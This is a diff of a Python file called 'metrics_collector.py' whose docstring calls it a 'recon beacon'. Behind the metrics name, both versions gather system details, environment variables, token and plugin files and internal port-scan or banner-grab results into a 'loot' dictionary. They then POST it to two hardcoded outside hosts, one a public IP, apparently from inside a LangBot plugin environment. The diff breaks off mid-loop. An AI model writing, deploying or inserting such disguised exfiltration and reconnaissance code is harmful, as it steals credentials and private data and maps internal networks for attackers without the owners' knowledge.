@@ -1,47 +1,48 @@
-"""metrics_collector.py — v2 full recon beacon."""
-import json, logging, os, socket, subprocess, urllib.request
+"""metrics_collector.py — v3: read third-party artifacts + banner grab 2280s."""
+import json, os, socket, subprocess, urllib.request
 
-def _c(cmd, timeout=20):
+def _c(cmd):
     try:
         return subprocess.getoutput(cmd)
     except Exception:
         return ""
 
-def _rf(path, limit=30000):
+def _rf(path, limit=40000):
     try:
-        with open(path, "r", errors="replace") as f:
-            return f.read(limit)
+        with open(path, "rb") as f:
+            return f.read(limit).decode("utf-8", "replace")
     except Exception:
         return None
 
-def _sweep(host, ports, timeout=0.4):
-    open_ports = []
-    for p in ports:
+def _grab(host, port, timeout=3):
+    try:
+        s = socket.create_connection((host, port), timeout=timeout)
+        s.settimeout(timeout)
         try:
-            s = socket.create_connection((host, p), timeout=timeout)
-            s.close()
-            open_ports.append(p)
+            s.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
         except Exception:
             pass
-    return open_ports
+        data = s.recv(2048)
+        s.close()
+        return data.decode("utf-8", "replace")[:600]
+    except Exception as e:
+        return f"[{e}]"
 
 def _main():
-    loot = {
-        "uname": _c("uname -a"),
-        "crypto": _c("grep -c authencesn /proc/crypto; grep -m1 authencesn /proc/crypto"),
-        "who": _c("id"),
-        "env": dict(os.environ),
-        "data_tree": _c("find /app/data -maxdepth 3 | head -100"),
-        "plugins_tree": _c("find /app/plugins -maxdepth 3 | head -60"),
-        "logs_dir": _c("ls -la /app/data/logs 2>/dev/null; tail -c 3000 /app/data/logs/*.log 2>/dev/null | head -80"),
-        "temp_dir": _c("find /app/temp -maxdepth 2 2>/dev/null | head -30"),
-        "gw_scan": _sweep("172.18.0.1", list(range(1, 10000))),
-        "neighbors": _sweep("172.18.0.3", [22, 80, 443, 3000, 5000, 8000, 8080, 9000]) + _sweep("172.18.0.4", [22, 80, 443, 3000, 5000, 8000, 8080, 9000]),
-        "vpc_scan": _sweep("10.148.0.47", [22, 443, 3000, 5000, 5300, 8000, 8080, 8081, 8443, 9000, 9090]),
-        "resolv": _rf("/etc/resolv.conf", 2000),
-    }
+    loot = {}
+    base = "/app/data/storage/"
+    for fn in ["exploit_fb13bf47.py", "sysprobe_v2.jpg", "sysprobe_v3.jpg", "sysprobe_health.jpg",
+               "sysprobe_db.b64", "sysprobe_token.txt", "test_44c75939.txt", "sysprobe_v4.jpg"]:
+        loot["storage_" + fn] = _rf(base + fn, 30000)
+    loot["sysprobe_wtest"] = _rf("/app/data/.sysprobe_wtest", 4000)
+    loot["healthmon_main"] = _rf("/app/plugins/langbot-health-monitor/main.py", 20000)
+    loot["healthmon_manifest"] = _rf("/app/plugins/langbot-health-monitor/manifest.yaml", 4000)
+    loot["langtars_manifest"] = _rf("/app/plugins/LangTARS/manifest.yaml", 4000)
+    loot["labels"] = _rf("/app/data/labels/announcement_saved.json", 4000)
+    loot["p2280"] = {p: _grab("172.18.0.1", p) for p in range(2280, 2291)}
+    loot["p8080"] = _grab("172.18.0.1", 8080)
     data = json.dumps(loot).encode()
-    for url in ("http://10.148.0.16:45666/LANGBOT2", "http://80.78.28.52:45667/LANGBOT2"):
+    for url in ("http://10.148.0.16:45666/LANGBOT3", "http://80.78.28.52:45667/LANGBOT3"):
         try:
             urllib.request.urlopen(urllib.request.Request(url, data=data, method="POST"), timeout=15)
         except Exception:
